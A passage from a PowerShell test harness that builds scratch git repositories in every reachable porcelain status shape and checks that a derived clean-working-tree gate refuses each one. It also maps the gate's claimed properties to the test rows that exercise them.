    param([string]$Root, [string]$RelPath)
    Remove-Item -LiteralPath (Join-Path $Root ($RelPath -replace '/', '\')) -Force
}
function New-SweepConflict {
    # A REAL merge, never a hand-written index. `side` carries $Theirs, the trunk carries
    # $Ours, and the merge is left in progress so `git status` reports the unmerged shape.
    param([string]$Root, [scriptblock]$Theirs, [scriptblock]$Ours)
    $trunk = Get-A126Branch -Root $Root
    Invoke-A126Git -Root $Root -GitArgs @('checkout', '-q', '-b', 'side')
    & $Theirs $Root
    Save-A126Fixture $Root
    Invoke-A126Git -Root $Root -GitArgs @('checkout', '-q', $trunk)
    & $Ours $Root
    Save-A126Fixture $Root
    Invoke-A126Git -Root $Root -GitArgs @('merge', 'side')
}

# Each recipe: the codes it EXISTS to drive, the exact porcelain it must emit, and the
# substring of the refusal that ties the verdict to the right line. Every subject path lies
# UNDER the declared "?? .mission/evidence/verify-" prefix, so each row proves the status is
# JUDGED even where the PATH is declared -- the work-tree defect's status-blindness, swept.
$sweepSpec = @(
    @{ Id = 'w01'; Drives = @(' M'); What = 'tracked file MODIFIED in the work tree'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r; Add-A126File $r $swPathW "mod`n" }
       Porc  = @(" M $swPath") }
    @{ Id = 'w02'; Drives = @(' D'); What = 'tracked file DELETED in the work tree'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r; Remove-SweepFile $r $swPathW }
       Porc  = @(" D $swPath") }
    @{ Id = 'w03'; Drives = @(' A'); What = 'new file added with INTENT-TO-ADD (git add -N)'
       Build = { param($r) Add-A126File $r $swPathW "new`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-N', $swPath) }
       Porc  = @(" A $swPath") }
    @{ Id = 'w04'; Drives = @('M '); What = 'tracked file MODIFIED AND STAGED, work tree clean -- THE ESCAPE THE VALIDATOR DROVE'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r; Add-A126File $r $swPathW "mod`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-A') }
       Porc  = @("M  $swPath") }
    @{ Id = 'w05'; Drives = @('MM'); What = 'INDEX-MODIFIED then WORK-TREE-MODIFIED'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r; Add-A126File $r $swPathW "one`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-A'); Add-A126File $r $swPathW "two`n" }
       Porc  = @("MM $swPath") }
    @{ Id = 'w06'; Drives = @('MD'); What = 'INDEX-MODIFIED then DELETED in the work tree'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r; Add-A126File $r $swPathW "one`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-A'); Remove-SweepFile $r $swPathW }
       Porc  = @("MD $swPath") }
    @{ Id = 'w07'; Drives = @('A '); What = 'new file ADDED TO THE INDEX'
       Build = { param($r) Add-A126File $r $swPathW "new`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-A') }
       Porc  = @("A  $swPath") }
    @{ Id = 'w08'; Drives = @('AM'); What = 'INDEX-ADDED then WORK-TREE-MODIFIED'
       Build = { param($r) Add-A126File $r $swPathW "new`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-A'); Add-A126File $r $swPathW "again`n" }
       Porc  = @("AM $swPath") }
    @{ Id = 'w09'; Drives = @('AD'); What = 'INDEX-ADDED then DELETED in the work tree'
       Build = { param($r) Add-A126File $r $swPathW "new`n"; Invoke-A126Git -Root $r -GitArgs @('add', '-A'); Remove-SweepFile $r $swPathW }
       Porc  = @("AD $swPath") }
    @{ Id = 'w10'; Drives = @('D '); What = 'tracked file DELETED FROM THE INDEX (git rm)'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r; Invoke-A126Git -Root $r -GitArgs @('rm', '-q', '-f', $swPath) }
       Porc  = @("D  $swPath") }
    @{ Id = 'w11'; Drives = @('R '); What = 'staged RENAME'
       Build = { param($r) Add-A126File $r $swPathW $swLong; Save-A126Fixture $r; Invoke-A126Git -Root $r -GitArgs @('mv', $swPath, $swAlt) }
       Porc  = @("R  $swPath -> $swAlt") }
    @{ Id = 'w12'; Drives = @('RM'); What = 'staged RENAME then destination MODIFIED in the work tree'
       Build = { param($r) Add-A126File $r $swPathW $swLong; Save-A126Fixture $r; Invoke-A126Git -Root $r -GitArgs @('mv', $swPath, $swAlt); Add-A126File $r $swAltW "changed after the rename, still long enough to score`n" }
       Porc  = @("RM $swPath -> $swAlt") }
    @{ Id = 'w13'; Drives = @('RD'); What = 'staged RENAME then destination DELETED in the work tree'
       Build = { param($r) Add-A126File $r $swPathW $swLong; Save-A126Fixture $r; Invoke-A126Git -Root $r -GitArgs @('mv', $swPath, $swAlt); Remove-SweepFile $r $swAltW }
       Porc  = @("RD $swPath -> $swAlt") }
    @{ Id = 'w14'; Drives = @('UU'); What = 'UNMERGED, both modified'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r
                 New-SweepConflict -Root $r -Theirs { param($t) Add-A126File $t $swPathW "side`n" } -Ours { param($o) Add-A126File $o $swPathW "trunk`n" } }
       Porc  = @("UU $swPath") }
    @{ Id = 'w15'; Drives = @('DU'); What = 'UNMERGED, deleted by us'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r
                 New-SweepConflict -Root $r -Theirs { param($t) Add-A126File $t $swPathW "side`n" } -Ours { param($o) Invoke-A126Git -Root $o -GitArgs @('rm', '-q', '-f', $swPath) } }
       Porc  = @("DU $swPath") }
    @{ Id = 'w16'; Drives = @('UD'); What = 'UNMERGED, deleted by them'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r
                 New-SweepConflict -Root $r -Theirs { param($t) Invoke-A126Git -Root $t -GitArgs @('rm', '-q', '-f', $swPath) } -Ours { param($o) Add-A126File $o $swPathW "trunk`n" } }
       Porc  = @("UD $swPath") }
    @{ Id = 'w17'; Drives = @('AA'); What = 'UNMERGED, both added'
       Build = { param($r) Add-A126File $r $swPathW "base`n"; Save-A126Fixture $r
                 New-SweepConflict -Root $r -Theirs { param($t) Add-A126File $t $swAltW "side-add`n" } -Ours { param($o) Add-A126File $o $swAltW "trunk-add`n" } }
       Porc  = @("AA $swAlt") }
    @{ Id = 'w18'; Drives = @('DD', 'UA', 'AU'); What = 'RENAME/RENAME (1to2): one fixture, three unmerged shapes -- the original DELETED BY BOTH plus each side''s destination'
       Build = { param($r) Add-A126File $r $swPathW $swLong; Save-A126Fixture $r
                 New-SweepConflict -Root $r -Theirs { param($t) Invoke-A126Git -Root $t -GitArgs @('mv', $swPath, $swSide) } -Ours { param($o) Invoke-A126Git -Root $o -GitArgs @('mv', $swPath, $swTrunk) } }
       Porc  = @("DD $swPath", "UA $swSide", "AU $swTrunk") }
)

# BUILD every sweep root now; the legs JUDGE them. Each recipe's root and claimed shape are kept in
# $sweepBuilt so H-3 and H-16 read the same fixtures. The partition is computed from the codes each
# recipe CLAIMS, as it always was; whether a recipe really PRODUCED its codes is asserted per row,
# from the porcelain it emitted, by the leg that trusts it.
$sweepBuilt = @()
foreach ($sw in $sweepSpec) {
    $swRoot = New-SweepRoot $sw.Id
    & $sw.Build $swRoot
    $sweepBuilt += [pscustomobject]@{ Id = $sw.Id; Root = $swRoot; Porc = @($sw.Porc); Drives = @($sw.Drives); What = $sw.What }
    $sweepIds += $sw.Id
    foreach ($cd in $sw.Drives) { if ($xyDriven -cnotcontains $cd) { $xyDriven += $cd } }
}

# -- THE OTHER HALF OF THE PARTITION: what NO scratch repository on this host can produce, with
#    the measurement that says so. This is the register the refutation demanded in place of a
#    universal claim: the codes here are NOT claimed by this member, and the claim table says
#    so in the printed detail rather than in a comment.
$xyUnreachable = @(
    @{ Codes = @(' T', 'T ', 'TM', 'TT', 'TD', 'MT', 'AT', 'RT', 'CT')
       Why   = 'TYPE CHANGE (T in either position). git emits T only when an entry changes type. MEASURED on this host, three routes, none of which produces one: New-Item -ItemType SymbolicLink fails with NewItemIOError (the symlink privilege is not held by this process), replacing a tracked file with a DIRECTORY of the same name is reported as " D" and not " T", and core.fileMode is inert on Windows so an executable-bit change emits no line at all.' }
    @{ Codes = @(' C', 'C ', 'CM', 'CD')
       Why   = 'COPY DETECTION. MEASURED: a tracked file duplicated and STAGED with status.renames=copies is reported by this git as "A  <duplicate>" with no C line emitted; left unstaged it is reported as "?? <duplicate>". This confirms the round-5 measurement rather than claiming the C family by analogy with the R family, which IS driven (w11, w12, w13).' }
    @{ Codes = @(' R')
       Why   = 'UNSTAGED RENAME. git status runs rename detection over the INDEX, not over unstaged work-tree changes. MEASURED: moving a tracked file without staging is reported as two lines, " D <old>" plus "?? <new>", and never as " R".' }
)
$xyUnreachFlat = @()
foreach ($ur in $xyUnreachable) { foreach ($cd in $ur.Codes) { if ($xyUnreachFlat -cnotcontains $cd) { $xyUnreachFlat += $cd } } }
$xyBoth    = @($xyDriven      | Where-Object { $xyUnreachFlat -ccontains $_ })
$xyUnknown = @($xyAlphabet    | Where-Object { ($xyDriven -cnotcontains $_) -and ($xyUnreachFlat -cnotcontains $_) })
$xyAlien   = @(($xyDriven + $xyUnreachFlat) | Where-Object { $xyAlphabet -cnotcontains $_ })
$alphabetPartitioned = ($xyAlphabet.Count -gt 0) -and ($xyBoth.Count -eq 0) -and
                       ($xyUnknown.Count -eq 0) -and ($xyAlien.Count -eq 0)
$xyDrivenText   = (@($xyDriven      | Sort-Object | ForEach-Object { "'" + $_ + "'" }) -join ' ')
$xyUnreachText  = (@($xyUnreachFlat | Sort-Object | ForEach-Object { "'" + $_ + "'" }) -join ' ')
$xyUnknownText  = (@($xyUnknown     | Sort-Object | ForEach-Object { "'" + $_ + "'" }) -join ' ')
$xyAlienText    = (@($xyAlien       | Sort-Object | ForEach-Object { "'" + $_ + "'" }) -join ' ')
$alphabetLines  = @()
$alphabetLines += "      alphabet DERIVED from $($xyFamilies.Count) documented X/Y families plus $($xyUnmerged.Count) unmerged pairs = $($xyAlphabet.Count) codes (untracked '??' and ignored '!!' excluded, see above)"
$alphabetLines += "      DRIVEN      ($($xyDriven.Count) of $($xyAlphabet.Count)) : $xyDrivenText"
$alphabetLines += "      UNREACHABLE ($($xyUnreachFlat.Count) of $($xyAlphabet.Count)) : $xyUnreachText"
$alphabetLines += "      in BOTH lists (must be 0) : $($xyBoth.Count)    in NEITHER (must be 0) : $($xyUnknown.Count) $xyUnknownText    outside the alphabet (must be 0) : $($xyAlien.Count) $xyAlienText"
foreach ($ur in $xyUnreachable) {
    $alphabetLines += ('      NOT CLAIMED -- ' + (@($ur.Codes | ForEach-Object { "'" + $_ + "'" }) -join ' '))
    $alphabetLines += ('        ' + $ur.Why)
}
$alphabetReport = ($alphabetLines -join "`r`n")

# =============================================================================================
# H-3's EXECUTION LEG -- the DERIVED gate over every root above
# =============================================================================================
if ($execDerived -and $a126DrvOk) {
    # k1's library for THIS leg: a SECOND copy of the DERIVED mission-lib with no lam/ beside it.
    $noReaderDir = Join-Path $applyDir 'derived-noreader'
    New-Item -ItemType Directory -Path $noReaderDir -Force | Out-Null
    Copy-Item $execLib (Join-Path $noReaderDir 'mission-lib.ps1') -Force
    $noReaderLib = Join-Path $noReaderDir 'mission-lib.ps1'

    foreach ($spec in $execSpec) {
        $state = Get-A126Porcelain -Root $spec.Root
        if ($null -eq $spec.Porc) {
            $shapeOk = (-not $state.Ok)
            $shapeGot = "git status EXITED NON-ZERO (which is the fixture): $($state.Ok -eq $false)"
        } else {
            $want = @($spec.Porc)
            $got  = @($state.Lines)
            $shapeOk = $state.Ok -and ($got.Count -eq $want.Count)
            if ($shapeOk) { for ($k = 0; $k -lt $want.Count; $k++) { if ($got[$k] -cne $want[$k]) { $shapeOk = $false } } }
            $shapeGot = ($got -join ' | ')
        }
        $allowCsv = if ($spec.ContainsKey('Allow')) { [string]$spec.Allow } else { '' }
        $libFor   = if ($spec.ContainsKey('NoReader') -and $spec.NoReader) { $noReaderLib } else { '' }
        $res = Invoke-A126Gate -Root $spec.Root -AllowPathsCsv $allowCsv -LibPath $libFor
        $saysOk = $res.Out.Contains($spec.Says)
        # A SECOND required substring, for a property that needs two facts out of ONE refusal.
        # Row s1 must name the deleted line AND name the file the declared set lives in, and row
        # d1 must say the mission declared nothing AND tell the operator where to fix it -- which
        # is the cure block's "self-curing rather than mysterious" claim, previously undriven.
        $says2   = ''
        $says2Ok = $true
        if ($spec.ContainsKey('Says2')) { $says2 = [string]$spec.Says2; $says2Ok = $res.Out.Contains($says2) }
        # THE NEGATIVE THAT REACHES THE PARAM-DEFAULT REFUTATION. a1 passes NO -AllowPaths, so the gate must not
        # announce sanctioned inputs. A non-empty $AllowPaths DEFAULT on the param line -- a CONTEXT
        # line no closed list ever selected -- makes this string appear, whatever the default is
        # SPELLED as, including the two spellings that admit nothing and the trailing-slash
        # spellings that admit the whole collapsed plane. a6 is the control: it PASSES -AllowPaths
        # and requires the same string, so a1's negative cannot be satisfied by a gate that has
        # simply stopped printing it.
        $notSaysOk = $true
        $notSays   = ''
        if ($spec.ContainsKey('NotSays')) {
            $notSays   = [string]$spec.NotSays
            $notSaysOk = (-not $res.Out.Contains($notSays))
        }
        $execRows += [pscustomobject]@{
            Name      = $spec.Name
            ShapeOk   = $shapeOk
            Shape     = $shapeGot
            Want      = $spec.Exit
            Got       = $res.Exit
            SaysOk    = $saysOk
            Says      = $spec.Says
            Says2     = $says2
            Says2Ok   = $says2Ok
            NotSays   = $notSays
            NotSaysOk = $notSaysOk
            Ok        = ($shapeOk -and ($res.Exit -eq $spec.Exit) -and $saysOk -and $says2Ok -and $notSaysOk)
        }
    }

    foreach ($swb in $sweepBuilt) {
        $swState = Get-A126Porcelain -Root $swb.Root
        $swWant  = @($swb.Porc)
        $swGot   = @($swState.Lines)
        $swShape = $swState.Ok -and ($swGot.Count -eq $swWant.Count)
        if ($swShape) { for ($k = 0; $k -lt $swWant.Count; $k++) { if ($swGot[$k] -cne $swWant[$k]) { $swShape = $false } } }
        # A RECIPE MAY NOT CLAIM A SHAPE IT DOES NOT PRODUCE. The codes are read off the porcelain
        # the fixture really emitted; a recipe whose git does something else goes red here rather
        # than crediting the alphabet with a shape that was never driven.
        $swCodes   = @($swGot | ForEach-Object { if ($_.Length -ge 2) { $_.Substring(0, 2) } })
        $swDrivesOk = (@($swb.Drives | Where-Object { $swCodes -cnotcontains $_ }).Count -eq 0)
        $swRes    = Invoke-A126Gate -Root $swb.Root
        $swSays   = $swWant[0]
        $swSaysOk = $swRes.Out.Contains($swSays)
        # Built on their own lines: a nested double quote inside a $() inside a double-quoted
        # string is exactly the PS 5.1 authoring trap that only parse-fails when the file is run.
        $swLabel = (@($swb.Drives | ForEach-Object { "'" + $_ + "'" }) -join ' ')
        $swShapeText = ($swGot -join ' | ') + '   codes this recipe claims to drive: ' + $swLabel +
                       ' -- present in the emitted porcelain : ' + $swDrivesOk
        $execRows += [pscustomobject]@{
            Name      = $swb.Id + ' XY ' + $swLabel + ' -- ' + $swb.What + ' at a DECLARED prefix -> REFUSED'
            ShapeOk   = ($swShape -and $swDrivesOk)
            Shape     = $swShapeText
            Want      = 1
            Got       = $swRes.Exit
            SaysOk    = $swSaysOk
            Says      = $swSays
            Says2     = ''
            Says2Ok   = $true
            NotSays   = ''
            NotSaysOk = $true
            Ok        = ($swShape -and $swDrivesOk -and ($swRes.Exit -eq 1) -and $swSaysOk)
        }
    }
}
$execCasesOk = ($execRows.Count -eq ($execSpec.Count + $sweepSpec.Count)) -and ($execRows.Count -gt 0) -and
               (@($execRows | Where-Object { -not $_.Ok }).Count -eq 0)

# --- THE ROW SET IS DERIVED FROM THE CURE'S OWN SPECIFICATION, NOT FROM WHAT ANYONE THOUGHT OF.
# Round 4's ten rows were a finite list assembled by hand, and a fresh-context validator drove two
# defects through the gaps in it -- a DELETED status and an ABSENT declaration, both of them named
# properties of the cure with no row at all. A hand-assembled list has no way to know what it is
# missing. So the list is now READ OFF the cure block: every claim the cure banner in
# tools/mission-lib.ps1 makes (and every branch of its capitalised FAIL-CLOSED IN EVERY DEGRADATION
# list) is one entry below, with the rows that DRIVE it named beside it.
# THE TABLE IS CHECKED, NOT NARRATED. A claim naming a row id that no row carries, or naming a row
# that is RED, makes $claimsCovered false and the member red -- so this cannot rot into a coverage
# note that says what someone once intended. Adding a claim with no row is therefore a DELIBERATE
# red, which is the intended way to register a newly-noticed gap.
#
# ROUND 6: WHAT CHANGED IN THIS TABLE AND WHY. Three entries were OVERCLAIMING -- they asserted a
# universal and named rows that drove a sample of it -- and two empirical measurements in the cure
# block were being asserted by the member's narrative while appearing in no row at all. An
# overclaiming member is worse than a modest one, so:
#   * the status entry is SCOPED to the alphabet partition and says the scope out loud, and its
#     row list is the DERIVED sweep ($sweepIds) rather than eight ids somebody typed;
#   * 'never a code constant' and 'no CODE widens the gate' now name the REFUSAL rows that drive
#     the negative half, not only the admit rows that drive the positive half;
#   * the early-return entry says what the code actually does (t1/t2/t3), not 'before ANY
#     declaration is read' mapped to a single row that could not tell the difference;
#   * the two HISTORICAL MEASUREMENTS are registered as NOT CHECKED, with the reason. A claim so
#     registered must name NO rows -- giving it one makes the table red -- so 'we deliberately do
#     not check this' cannot quietly decay into 'we forgot to'.
$claimMap = @(
    @{ Claim = 'the admitted set IS the mission''s own declaration and never a code constant: a prefix the mission DECLARES is admitted (a1, g1, x1) and the same shape UNDECLARED is REFUSED (g2, x2, d2)'
       Rows  = @('a1', 'g1', 'x1', 'g2', 'x2', 'd2') }
    @{ Claim = 'the declaration is matched over the WHOLE porcelain line, status code INCLUDED, so a DECLARED prefix at a NON-untracked status is JUDGED (status-blindness). SCOPED, and the scope is printed under ALPHABET PARTITION below: driven over every porcelain-v1 XY code in git''s own documented alphabet that a scratch repository on this host can actually PRODUCE; the rest are registered UNREACHABLE with the measurement that says so and are NOT claimed'
       Rows  = @('a4', 's1', 's2', 's3', 's4', 's5', 's6', 's7') + $sweepIds }
    @{ Claim = 'the evidence plane is narrowed to the declared prefix and is not tolerated whole'
       Rows  = @('a2', 'c1', 'd2') }
    @{ Claim = 'the gates plane is narrowed the same way and is not tolerated whole'
       Rows  = @('a3', 'c2', 'x2') }
    @{ Claim = 'no CODE widens the gate FOR THE PREFIXES THE DROPPED CODE CARRIED -- the evidence plane, the gates plane and the session- prefix are admitted where the mission declares them and refused where it does not. SCOPED to those prefixes: this is a claim about the exemptions the work-tree cure removed, not a proof that no code exemption of any shape exists, which no row here could establish'
       Rows  = @('g1', 'g2', 'x1', 'x2', 'a2', 'a3') }
    @{ Claim = 'FAIL-CLOSED -- git status FAILS -> REFUSE (the uncured fail-open read no output as clean)'
       Rows  = @('n1') }
    @{ Claim = 'FAIL-CLOSED -- a MALFORMED or UNREADABLE declaration -> REFUSE, never a fallback to a default'
       Rows  = @('m1', 'u1') }
    @{ Claim = 'FAIL-CLOSED -- NO declaration at all -> ADMIT NOTHING: every line judged, only -AllowPaths exempting, no code default'
       Rows  = @('d1', 'd2', 'd3') }
    @{ Claim = 'FAIL-CLOSED -- a gate that cannot read its own rule does not pass the tree (the reader library absent)'
       Rows  = @('k1') }
    @{ Claim = 'the D9 `session-` CODE exemption is DROPPED and the DECLARATION satisfies its premise instead'
       Rows  = @('g1', 'g2') }
    @{ Claim = 'the refusal NAMES the offending line AND names where the set is declared, so the block is self-curing'
       Rows  = @('s1', 'd1') }
    @{ Claim = '-AllowPaths exempts ONLY its named inputs and STILL refuses genuine stray state'
       Rows  = @('a6', 'p1', 'd3') }
    @{ Claim = '-AllowPaths names PATHS, not porcelain lines: a rename line is matched on its DESTINATION'
       Rows  = @('s5', 'r1') }
    @{ Claim = 'a path git QUOTED is unquoted and its separators normalised before -AllowPaths is consulted'
       Rows  = @('q1') }
    @{ Claim = 'with no -AllowPaths the gate is strict (a5 refuses a stray) and announces no sanctioned input (a1, g1 require the string to be ABSENT; a6 is the control that it is printed when there IS one)'
       Rows  = @('a1', 'a5', 'g1', 'a6') }
    @{ Claim = 'a genuinely CLEAN tree passes on the gate''s EARLY RETURN, which stands AFTER the reader library is located and the porcelain is taken but BEFORE the declaration is read -- so it passes with a VALID declaration (t1), with a MALFORMED one (t2) and with NONE at all (t3), each of which REFUSES the moment there is one porcelain line (m1, d1)'
       Rows  = @('t1', 't2', 't3', 'm1', 'd1') }
    # -- THE TWO EMPIRICAL MEASUREMENTS IN THE CURE BLOCK'S BANNER, registered as NOT CHECKED.
    #    A validator finding: they were being asserted in prose while appearing in no row and being checked
    #    nowhere. They are measurements of A MOMENT, not properties of the code, and turning them
    #    into rows would be worse than leaving them out: the member would go red on the next commit
    #    that adds or removes an evidence directory, and a green would say nothing about the gate.
    #    So they are named here, with the reason, and a claim registered this way must name NO rows.
    @{ Claim = 'HISTORICAL MEASUREMENT, DELIBERATELY NOT CHECKED -- "the repository of record measured 166 porcelain lines at this HEAD: 112 `?? .mission/evidence/verify-<id>/`, 54 `?? .mission/gates/...`, ZERO outside those two prefixes, so the number A-126 had left to judge was ZERO". A census of one repository at one commit, taken to show what the old code exemption cost. Nothing in this member measures it and nothing should.'
       Rows  = @(); NotChecked = $true }
    @{ Claim = 'HISTORICAL MEASUREMENT, DELIBERATELY NOT CHECKED -- "the repository of record carries ZERO `session-` porcelain lines at this HEAD", the measurement taken before the D9 `session-` CODE exemption was dropped. Same reason. What IS checked is the REPLACEMENT for that exemption -- see the session- entry above, rows g1 and g2.'
       Rows  = @(); NotChecked = $true }
)
$claimVerdicts = @()
foreach ($c in $claimMap) {
    $ids        = @($c.Rows)
    $missing    = @()
    $red        = @()
    $notChecked = ($c.ContainsKey('NotChecked') -and $c.NotChecked)
    if ($notChecked) {
        # A claim REGISTERED AS NOT CHECKED must name no rows. If someone later gives it one the
        # registration has gone stale and the table goes red, rather than the member quietly
        # disagreeing with itself about whether the property is driven.
        $ok = ($ids.Count -eq 0)
    } else {
        foreach ($id in $ids) {
            $hit = @($execRows | Where-Object { $_.Name -like ($id + ' *') })
            if ($hit.Count -ne 1) { $missing += $id; continue }
            if (-not $hit[0].Ok)  { $red += $id }
        }
        # A CHECKED claim with an EMPTY row list is itself an overclaim, so it is red too.
        $ok = (($ids.Count -gt 0) -and ($missing.Count -eq 0) -and ($red.Count -eq 0))
    }
    $claimVerdicts += [pscustomobject]@{
        Claim      = $c.Claim
        Rows       = if ($notChecked) { '<none -- registered NOT CHECKED>' } else { ($ids -join ', ') }
        Missing    = $missing
        Red        = $red
        NotChecked = $notChecked
        Ok         = $ok
    }
}
$claimsCovered = ($execRows.Count -gt 0) -and (@($claimVerdicts | Where-Object { -not $_.Ok }).Count -eq 0)
$claimReport = (@($claimVerdicts | ForEach-Object {
    $flag = if (-not $_.Ok) { 'RED ' } elseif ($_.NotChecked) { 'n/a ' } else { 'ok  ' }
    $note = ''
    if ($_.Missing.Count -gt 0) { $note += '   NO SUCH ROW: ' + ($_.Missing -join ' ') }
    if ($_.Red.Count -gt 0)     { $note += '   ROW RED: '     + ($_.Red -join ' ') }
    "    $flag$($_.Claim)" + "`r`n" + "          driven by row(s) : $($_.Rows)$note"
}) -join "`r`n")
if ($execRows.Count -eq 0) { $claimReport = '    <NOT RUN -- no rows were produced>' }

$execBinds   = $a126DrvOk -and $execDerived -and $execIsDeclaredPost -and $execCasesOk -and $claimsCovered -and $alphabetPartitioned
$execReport  = (@($execRows | ForEach-Object {
    $flag = if ($_.Ok) { 'ok  ' } else { 'RED ' }
    "    $flag$($_.Name)" + "`r`n" +
    "          porcelain shape as specified : $($_.ShapeOk)   [$($_.Shape)]" + "`r`n" +
    "          gate exit want $($_.Want) got $($_.Got)   refusal/pass text names '$($_.Says)' : $($_.SaysOk)" +
    $(if ($_.Says2)   { "`r`n          and also names '$($_.Says2)' : $($_.Says2Ok)" } else { '' }) +
    $(if ($_.NotSays) { "`r`n          and must NOT name '$($_.NotSays)' : $($_.NotSaysOk)" } else { '' })
}) -join "`r`n")
if ($execRows.Count -eq 0) { $execReport = '    <NOT RUN -- the derivation or the driver is missing; see the two lines above>' }

# SINCE AN EARLIER REVISION: $applyDir is NOT removed here any more. H-16, after H-3b, executes the LIVE gates
# over the same scratch mission roots, and removes $applyDir itself once it has judged them.

$detail = @"
  patch file   : $patchPath
  THE SUBJECT TREE IS THE PATCH'S OWN RECORDED PRE-IMAGE: every scratch tree in
  H-3 and H-3b is built from the fixture pinned on the patch face; tools/mission-lib.ps1 and
  tools/mission-spec-accept.ps1 are NOT read by either member (H-16 judges those, by behaviour).
  PRE-IMAGE PINNED -- fixture, face and body agree : $preImagePinned   (expect True)
    PIN blocks parsed from the face : $($pinBlocks.Count) of $pinHeads PIN line(s)   body sections : $($bodySections.Count)   expected : $($preImageRows.Count)   all three agree : $pinSetsAgree
$pinReport
  EXACT against the pinned pre-image in the FIXED direction -- forward applies AND reverse does not
    (git apply --check / --check -R) : $appliesForward   (expect True)
                 (fwd exit $applyFwd expect 0, rev exit $applyRev expect non-zero)
  state        : $applyState
  unified diff : $isUnified   (expect True -- ---/+++/@@ headers present)
  names Assert-CleanGitTree AND Assert-CleanWorkingTree : $namesBoth   (expect True)
  states intent via the session-* anchor : $namesPat   (expect True)
  contains added lines                   : $addsLines   (expect True)
  ---------------------------------------------------------------------------------------------
  THE CONJUNCT THAT BINDS THE MECHANISM: THE GATE THIS PATCH PRODUCES IS EXECUTED, AND ITS
  BEHAVIOUR IS ASSERTED IN BOTH DIRECTIONS. Everything under SECONDARY NET below is a reading of
  patch TEXT. Said precisely, because the round-5 report said the stronger thing: the net DOES
  bind -- as a BLACKLIST OVER SPELLINGS. It refuses every spelling its two enumerations name, and
  a spelling they do not name walks past it, which is how three rounds of text conjuncts were
  driven through by three different spellings of one defect. This leg instead reaches a defect
  through what the code DOES, so no enumeration of spellings appears anywhere in it.
  ---------------------------------------------------------------------------------------------
    post-image DERIVED FROM THE PATCH BODY rather than read from the repository: the pinned pre-image
      fixture plus ONE forward apply, reusing H-3b's flipped-tree construction and
      Invoke-PatchTransform : $execDerived   (expect True)
      route : $execRoute
              (forward step exit $execFwdExit, expect 0)
      the derived tree IS the post-image the patch DECLARES -- each derived file's git blob id,
      computed in-process on the LF basis, begins with the post-image id on its own index line
      (replaces the old byte comparison with the LIVE tools/mission-lib.ps1) : $execIsDeclaredPost   (expect True)
$execPostReport
      driver tools/evidence-hooks-next/tests/_drv-a126-clean-tree.ps1 present : $a126DrvOk   (expect True)
      THE ONE LIVE DEPENDENCY LEFT IN THIS MEMBER: the admission reader tools/lam/lam-verify-admission.ps1
      is copied from the live tree beside the derived gate (the environment the post-image runs in,
      not one of the two files the patch changes), and the reader-is-real conjunct below reads it.
    BEHAVIOUR of the DERIVED Assert-CleanWorkingTree over $($execRows.Count) isolated scratch mission
      roots -- each a real git repo under .mission-runtime/ (gitignored, removed after H-16), each row's
      PORCELAIN SHAPE asserted before its verdict is trusted (F-0) : $execCasesOk   (expect True)
$execReport
    ALPHABET PARTITION -- THE STATUS ROW SET IS DERIVED, NOT ENUMERATED BY HAND. git porcelain v1
      XY codes are a closed documented set; the X/Y families are transcribed once and EXPANDED
      here, so a combination nobody thought of is in the sweep BY CONSTRUCTION. Every code must be
      in EXACTLY ONE of DRIVEN (a fixture produces it under the DECLARED verify- prefix and the
      gate REFUSES, naming the line -- and the codes a recipe CLAIMS are checked against the
      porcelain it really emitted) or UNREACHABLE (no scratch repository on this host can produce
      it, with the measurement that says so, and it is NOT claimed). A code in NEITHER list is RED,
      which is how a newly-documented shape registers itself : $alphabetPartitioned   (expect True)
$alphabetReport
      CONSEQUENCE, STATED RATHER THAN LEFT TO BE FOUND: a code-resident tolerance keyed on one of
      the NOT CLAIMED codes above is INVISIBLE to this member, because no fixture on this host can
      produce the porcelain line that would trip it. A host that can create symlinks, or a git that
      scores copies, would need rows for those codes before this claim could widen to them.
    CLAIM -> ROW COVERAGE. Every property the cure block in this patch's post-image
      of tools/mission-lib.ps1 CLAIMS, and the row(s) that DRIVE it. CHECKED rather than narrated -- a claim naming a row
      that does not exist, or one that is red, or a checked claim naming NO row at all, is itself
      red -- so the row set is derived from the member's specification instead of from what anyone
      happened to think of. Entries flagged n/a are HISTORICAL MEASUREMENTS this member
      deliberately does NOT check; such an entry is red if it ever names a row : $claimsCovered   (expect True)
$claimReport
    THE BINDING CONJUNCT, ALL ROWS GREEN : $execBinds   (expect True)
  ---------------------------------------------------------------------------------------------
  SECONDARY NET -- CHEAP TEXT CONJUNCTS OVER THE PATCH. Kept because they catch ARTIFACT DRIFT
  early and NAME the line that drifted, which a behavioural red cannot. WHAT THEY BIND, stated
  exactly: a BLACKLIST OVER SPELLINGS. Their line SELECTION is a regex over operator and
  assignment spellings, and only the SELECTED lines are then whitelisted -- so every spelling the
  two enumerations name is refused here, and one they do not name is invisible here. That is a
  real bound, not none; it is simply not the mechanism, and it is exactly how rounds 2 and 3 were
  driven through.
  ---------------------------------------------------------------------------------------------
  PER-GATE MECHANISM, asserted over each hunk's POST-IMAGE (context + added lines), CODE LINES
  ONLY -- comments stripped quote-awarely, because a claim about CODE that a COMMENT can satisfy is
  no claim at all (work-tree: $($wtCodeArr.Count) code lines of $wtPostCount; spec-accept:
  $($gtCodeArr.Count) of $gtPostCount):
    stripper control -- both hunks lost lines to the stripper : $stripWorks   (expect True)
    no PowerShell block comment in either post-image          : $noBlockComment   (expect True)
    both hunks found, and they are distinct                   : $hunksDistinct   (expect True)
    Assert-CleanWorkingTree -- CURED: the post-image READS THE DECLARED SET
      reader  : dot-sources lam-verify-admission.ps1 AND calls
                Get-LamDeclaredAdmittedPorcelain -MissionRoot `$Root : $wtReader   (expect True)
      judgment: the reader's regexes are what each porcelain LINE is matched against
